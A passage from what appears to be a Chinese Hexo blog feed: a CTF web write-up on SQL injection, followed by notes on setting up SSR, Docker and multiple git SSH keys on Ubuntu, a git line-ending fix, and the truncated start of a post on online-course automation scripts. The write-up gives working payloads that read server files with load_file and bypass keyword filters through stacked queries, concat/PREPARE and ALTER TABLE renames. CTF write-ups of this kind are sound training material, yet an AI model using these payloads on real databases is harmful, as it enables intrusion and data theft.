<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp/ unzip html.zip </span><br><span class="line">rm -f html.zip </span><br><span class="line">cp -r html /var/www/ </span><br><span class="line">cd /var/www/html/ </span><br><span class="line">rm -f .DS_Store </span><br><span class="line">service apache2 <span class="keyword">start</span></span><br></pre></td></tr></table></figure>
<p>他在启动服务器前到/tmp/目录解压了html.zip,删除压缩包后将html移到/var/www/目录下,再把.DS_Store数据表删了,也就是说在/tmp/目录下.DS_Store数据表还在,继续查表(不加hex会显示乱码)</p>
<p>‘,content=(select hex(load_file(‘//tmp/html/.DS_Store’))),/**/# </p>
<p>得到一大串hex码,丢进notepad里转ascil码,得到一个  flag_8946e1ff1ee3e40f.php<br>读一下这个文件,老方法<br>‘,content=(select hex(load_file(‘//var/www/html/flag_8946e1ff1ee3e40f.php’))),/**/#<br>丢进notepad里转码,得到flag<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$flag=<span class="string">"flag&#123;wdb2018_truncation_sql_inject&#125;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<h1 id="http-47-102-141-139-8302"><a href="#http-47-102-141-139-8302" class="headerlink" title="http://47.102.141.139:8302"></a><a href="http://47.102.141.139:8302" target="_blank" rel="noopener">http://47.102.141.139:8302</a></h1><p>首先看源码,没有东西,提交后出现php数组,想到可以构造mysql语句报错查数据库<br>select databases  报错<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_match(<span class="string">"/select|update|delete|drop|insert|where|\./i"</span>,$inject);</span><br></pre></td></tr></table></figure></p>
<p>过滤了很多查数据库的命令,正则/i过滤大小写,第一反应没有限制show,就用show查库<br><a href="http://47.102.141.139:8302/?inject=1&#39;;show" target="_blank" rel="noopener">http://47.102.141.139:8302/?inject=1&#39;;show</a> databases;#<br>‘;闭合前部分,#注释后部分,查出库名<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  string(<span class="number">11</span>) <span class="string">"ctftraining"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  string(<span class="number">18</span>) <span class="string">"information_schema"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  string(<span class="number">5</span>) <span class="string">"mysql"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  string(<span class="number">18</span>) <span class="string">"performance_schema"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  string(<span class="number">9</span>) <span class="string">"supersqli"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  string(<span class="number">4</span>) <span class="string">"test"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>继续查supersqli表,出现一串数字组<br><a href="http://47.102.141.139:8302/?inject=1&#39;;show" target="_blank" rel="noopener">http://47.102.141.139:8302/?inject=1&#39;;show</a> tables from supersqli;#</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  string(<span class="number">16</span>) <span class="string">"1919810931114514"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  string(<span class="number">5</span>) <span class="string">"words"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>想继续用show查字段名无回显了,然后有三种办法,一是预编译slect查flag,二是alter方法修改表名直接读取flag,三是将过滤词拆分绕过select<br>我用的第三种,因为最简单而且我以前做题用到过,可以将要执行的sql语句进行拼接(也可以一句句来)，将过滤的sql关键字拆分绕过检测<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.102.141.139:8302/?inject=1&apos;;use information_schema;set @sql=concat(&apos;s&apos;,&apos;elect column_name from columns wher&apos;,&apos;e table_name=&quot;1919810931114514&quot;&apos;);PREPARE stmt1 FROM @sql;EXECUTE stmt1;--+</span><br></pre></td></tr></table></figure></p>
<p>通过执行sql语句发现1919810931114514表当中存在flag字段<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  string(<span class="number">4</span>) <span class="string">"flag"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>直接在上一个语句的基础上构造payload<br><a href="http://47.102.141.139:8302/?inject=1&#39;;use" target="_blank" rel="noopener">http://47.102.141.139:8302/?inject=1&#39;;use</a> supersqli;set @sql=concat(‘s’,’elect <code>flag</code> from <code>1919810931114514</code>‘);PREPARE stmt1 FROM @sql;EXECUTE stmt1;–+<br>(预处理语句,如果查询内容不存在,会引发一个错误)<br>得到flag<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  string(<span class="number">32</span>) <span class="string">"flag&#123;glzjin_wants_a_girl_firend&#125;"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>另两种方法对着别人的wp也复现了一下</p>
<ul>
<li>预编译slect查flag</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set @sql=concat(<span class="string">'sel'</span>,<span class="string">'ect * from `1919810931114514`'</span>);prepare presql from @sql;execute presql;deallocate prepare presql;</span><br><span class="line"><span class="comment">// 提示:strstr($inject, "set") &amp;&amp; strstr($inject, "prepare")</span></span><br><span class="line"><span class="comment">// 用 strstr 来匹配关键字，直接大小写关键字即可绕过</span></span><br></pre></td></tr></table></figure>
<p>payload:  <a href="http://47.102.141.139:8302/?inject=1&#39;%3bSet+%40sqll%3dconcat(&#39;sel&#39;,&#39;ect+*+from+`1919810931114514`&#39;)%3bPrepare+presql+from+%40sqll%3bexecute+presql%3bdeallocate+Prepare+presql%3b%23" target="_blank" rel="noopener">http://47.102.141.139:8302/?inject=1&#39;%3bSet+%40sqll%3dconcat(&#39;sel&#39;,&#39;ect+*+from+`1919810931114514`&#39;)%3bPrepare+presql+from+%40sqll%3bexecute+presql%3bdeallocate+Prepare+presql%3b%23</a></p>
<ul>
<li>alter方法修改表名直接读取flag</li>
</ul>
<p>先加id列  <a href="http://47.102.141.139:8302/?inject=1&#39;;alter+table+`1919810931114514`+rename+to+`damya`;alter+table+`words`+rename+to+`damya3`;alter+table+`damya`+rename+to+`words`;%23" target="_blank" rel="noopener">http://47.102.141.139:8302/?inject=1&#39;;alter+table+`1919810931114514`+rename+to+`damya`;alter+table+`words`+rename+to+`damya3`;alter+table+`damya`+rename+to+`words`;%23</a><br>payload:  <a href="http://47.102.141.139:8302/?inject=1&#39;;ALTER" target="_blank" rel="noopener">http://47.102.141.139:8302/?inject=1&#39;;ALTER</a> TABLE <code>1919810931114514</code> ADD <code>id</code> INT(1) NOT NULL DEFAULT ‘1’ AFTER <code>flag</code>;%23</p>
]]></content>
      
        <categories>
            
            <category> ctf writeup web </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 靶场练习 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ubuntu16.04搭建ssr/docker/git配置]]></title>
      <url>/%E6%90%AD%E5%BB%BA/ckwd5ws9e004vd0uc22f35n49/</url>
      <content type="html"><![CDATA[<p>在rfc新换了一个ip,重新搭一下ssr和docker,记录下过程和遇到的问题</p>
<hr>
<h1 id="搭建ssr"><a href="#搭建ssr" class="headerlink" title="搭建ssr"></a>搭建ssr</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt update -y</span><br><span class="line">apt upgrade</span><br></pre></td></tr></table></figure>
<p>在upgrade的时候遇到了这个问题</p>
<blockquote>
<p>Could not find /boot/grub/menu.lst file. Would you like /boot/grub/menu.lst generated for you? (y/N) /usr/sbin/update-grub: line 1094: read: read error: 0: Bad file descriptor<br>run-parts: /etc/kernel/postinst.d/zz-update-grub exited with return code 1<br>dpkg: error processing package linux-image-4.15.0-51-generic (–configure):<br> subprocess installed post-installation script returned error exit status 1<br>Errors were encountered while processing:<br> linux-image-4.15.0-50-generic<br> linux-image-4.15.0-51-generic<br>E: Sub-process /usr/bin/dpkg returned an error code (1)</p>
</blockquote>
<p>解决方法是<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /var/lib/dpkg/</span><br><span class="line">$ sudo mv info info.bak</span><br><span class="line">$ sudo mkdir info</span><br><span class="line">$ sudo apt-get update</span><br><span class="line">$ sudo apt-get -f install</span><br><span class="line">这一步里会出现很多warning，是因为dpkg的info文件的缺失，不用担心，后面用info.bak恢复就可以了。</span><br><span class="line"></span><br><span class="line">更新和重新配置完成后，恢复info.bak</span><br><span class="line">$ sudo mv ./info/*./info.bak</span><br><span class="line">$ sudo rm -r info</span><br><span class="line">$ sudo mv info.bak info</span><br><span class="line"></span><br><span class="line">完成以上步骤，理论上问题应该解决了。</span><br></pre></td></tr></table></figure></p>
<p>然后安装需要的依赖<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install wget epel-release grub -y</span><br></pre></td></tr></table></figure></p>
<p>使用ssr一键管理脚本<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -N --no-check-certificate https://raw.githubusercontent.com/ToyoDAdoubi/doubi/master/ssr.sh &amp;&amp; chmod +x ssr.sh &amp;&amp; bash ssr.sh</span><br></pre></td></tr></table></figure></p>
<hr>
<h1 id="搭建docker"><a href="#搭建docker" class="headerlink" title="搭建docker"></a>搭建docker</h1><p>检查版本<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -r</span><br></pre></td></tr></table></figure></p>
<p>卸载旧版本<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get remove docker docker-engine docker-ce docker.io</span><br></pre></td></tr></table></figure></p>
<p>更新引索<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure></p>
<p>安装以下包以使apt可以通过HTTPS使用存储库（repository）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install -y apt-transport-https ca-certificates curl software-properties-common</span><br></pre></td></tr></table></figure></p>
<p>添加Docker官方的GPG密钥<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure></p>
<p>使用下面的命令来设置stable存储库<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add-apt-repository <span class="string">"deb [arch=amd64] https://download.docker.com/linux/ubuntu <span class="variable">$(lsb_release -cs)</span> stable"</span></span><br></pre></td></tr></table></figure></p>
<p>安装最新版本的Docker CE<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install -y docker-ce</span><br></pre></td></tr></table></figure></p>
<p>查看docker服务是否启动<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl status docker</span><br></pre></td></tr></table></figure></p>
<p>若未启动，则启动docker服务<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start docker</span><br></pre></td></tr></table></figure></p>
<p>经典的hello world,检验是否安装成功<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run hello-world</span><br></pre></td></tr></table></figure></p>
<hr>
<h2 id="几个docker常用到的命令："><a href="#几个docker常用到的命令：" class="headerlink" title="几个docker常用到的命令："></a>几个docker常用到的命令：</h2><p>(1)docker image  查看本地的docker镜像</p>
<p>(2)docker ps 查看正在运行的docker</p>
<p>(3)docker run [options] image [command] [arg…]</p>
<p>用到的option：-d 后台运行</p>
<p>-P 随机把容器的端口映射到一个主机未使用的高端口</p>
<p>-p 格式为主机端口：容器端口 ，自选端口映射</p>
<p>-i  以交互模式运行容器，常与-t连用</p>
<p>-t  为容器重新分配一个伪输入终端，常与-i连用</p>
<p>(3)docker stop 停止正在运行的容器</p>
<hr>
<h1 id="在git添加多个id-rsa-私钥-管理远程仓库"><a href="#在git添加多个id-rsa-私钥-管理远程仓库" class="headerlink" title="在git添加多个id_rsa(私钥)管理远程仓库"></a>在git添加多个id_rsa(私钥)管理远程仓库</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -f ~/.ssh/id_rsa -C <span class="string">"yourmail@xxx.com"</span>  //创建新私钥</span><br><span class="line">touch config  //新建config文件</span><br><span class="line">vim config</span><br></pre></td></tr></table></figure>
<p>编辑config文件，配置不同的仓库指向不同的密钥文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 第一个账号，默认使用的账号</span></span><br><span class="line">Host damya  //使用的用户名</span><br><span class="line">HostName github.com</span><br><span class="line">User git  //创建私钥时一路回车下去默认用户名,可以自己定义</span><br><span class="line">IdentityFile ~/.ssh/id_rsa</span><br><span class="line"><span class="comment"># 第二个账号</span></span><br><span class="line">Host ginkgo</span><br><span class="line">HostName github.com</span><br><span class="line">User git</span><br><span class="line">IdentityFile ~/.ssh/id_rsa_x</span><br></pre></td></tr></table></figure></p>
<h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><ol>
<li>ssh 客户端是通过类似 <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>:githubUserName/repName.git ** 的地址来识别使用本地的哪个私钥的，地址中的 User 是@前面的git， Host 是@后面的github.com。</li>
<li>如果所有账号的 User 和 Host 都为 git 和 github.com，那么就只能使用一个私钥。所以要对User 和 Host 进行配置，让每个账号使用自己的 Host，每个 Host 的域名做 CNAME 解析到 github.com，如上面配置中的Host second.github.com。</li>
<li>配置了别名之后，新的地址就是<a href="mailto:git@second.github.com" target="_blank" rel="noopener">git@second.github.com</a>:githubUserName/repName.git**（在添加远程仓库时使用）。这样 ssh 在连接时就可以区别不同的账号了。</li>
</ol>
<hr>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh-add -D  //清除私钥列表</span><br><span class="line">ssh-add id_rsa  //添加私钥</span><br><span class="line">ssh-add -l  //列出所有私钥及对应用户</span><br></pre></td></tr></table></figure>
<p>测试ssh链接<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br><span class="line">ssh -T git@second.github.com</span><br><span class="line"><span class="comment"># xxx! You’ve successfully authenticated, but GitHub does not provide bash access.</span></span><br><span class="line"><span class="comment"># 出现上述提示，连接成功</span></span><br></pre></td></tr></table></figure></p>
<p>报错:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Could not open a connection to your authentication agent.</span><br></pre></td></tr></table></figure></p>
<p>解决方法如下,将ssh挂载<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-agent bash --login -i</span><br></pre></td></tr></table></figure></p>
<p>取消git全局用户名/邮箱的设置，设置独立的用户名/邮箱<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 取消全局 用户名/邮箱 配置</span></span><br><span class="line">$ git config --global --<span class="built_in">unset</span> user.name</span><br><span class="line">$ git config --global --<span class="built_in">unset</span> user.email</span><br><span class="line"><span class="comment"># 进入项目文件夹，单独设置每个repo 用户名/邮箱</span></span><br><span class="line">$ git config user.email <span class="string">"xxxx@xx.com"</span></span><br><span class="line">$ git config user.name <span class="string">"xxxx"</span></span><br></pre></td></tr></table></figure></p>
<p>配置proxy<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global http.https://github.com.proxy socks://127.0.0.1:2014</span><br></pre></td></tr></table></figure></p>
<p>clone远程仓库到本地<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> ginkgo:GinkgoTeam/CTF_Assemble</span><br></pre></td></tr></table></figure></p>
<p>查看git项目的配置<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --list</span><br></pre></td></tr></table></figure></p>
<p>查看git项目信息<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git remote  //一般出现origin(私人)<span class="built_in">clone</span>成功</span><br><span class="line">git remote -v  //列出仓库对应的<span class="built_in">clone</span>链接</span><br></pre></td></tr></table></figure></p>
<p>命令行进入项目目录，重建 origin (whatever 为相应项目地址)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ git remote rm origin</span><br><span class="line"><span class="comment"># 远程仓库地址，注意Host名称</span></span><br><span class="line">$ git remote add origin git@second.github.com:githubUserName/repName.git</span><br><span class="line">$ git remote -v <span class="comment"># 查看远程</span></span><br></pre></td></tr></table></figure></p>
<p>远程 push 测试<br>首先在 GitHub 上新建一个名为 testProj 的远程仓库，然后再在本地建一个本地仓库。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ~/documnts</span><br><span class="line">$ mkdir testProj</span><br></pre></td></tr></table></figure></p>
<ol>
<li>进入 testProj 文件夹，创建 REDME.md文件</li>
<li>初始化此文件夹为git</li>
<li>添加并提交README.md到Git本地仓库</li>
<li>添加远程仓库</li>
<li>把README.md推送到远程仓库<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> testProj</span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">"# ludilala.github.io"</span> &gt;&gt; README.md</span><br><span class="line">$ git init</span><br><span class="line">$ git add README.md</span><br><span class="line">$ git commit -m <span class="string">"first commit"</span></span><br><span class="line"><span class="comment"># 如果前面已添加远程连接，就无需再次添加</span></span><br><span class="line">$ git remote add origin https://github.com/ludilalaa/ludilala.github.io.git</span><br><span class="line">$ git push -u origin master</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      
        <categories>
            
            <category> 搭建 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ubuntu16.04 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[[git]warning: LF will be replaced by CRLF in 解决办法]]></title>
      <url>/%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3/ckwd5ws98004kd0ucud5byzwj/</url>
      <content type="html"><![CDATA[<p>原因是需要提交的文件是在windows下生成的，windows中的换行符为 CRLF， 而在linux下的换行符为LF，所以在执行add . 时出现提示，解决办法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global core.autocrlf false</span><br></pre></td></tr></table></figure></p>
<p>再执行git 提交</p>
]]></content>
      
        <categories>
            
            <category> 报错解决 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[常用的刷课工具(知到,学习通)]]></title>
      <url>/%E5%B7%A5%E5%85%B7/ckwd5ws9y005kd0ucq23kv5up/</url>
      <content type="html"><![CDATA[<h2 id="学习通刷课脚本-需配合油猴插件"><a href="#学习通刷课脚本-需配合油猴插件" class="headerlink" title="学习通刷课脚本(需配合油猴插件)"></a>学习通刷课脚本(需配合油猴插件)</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span 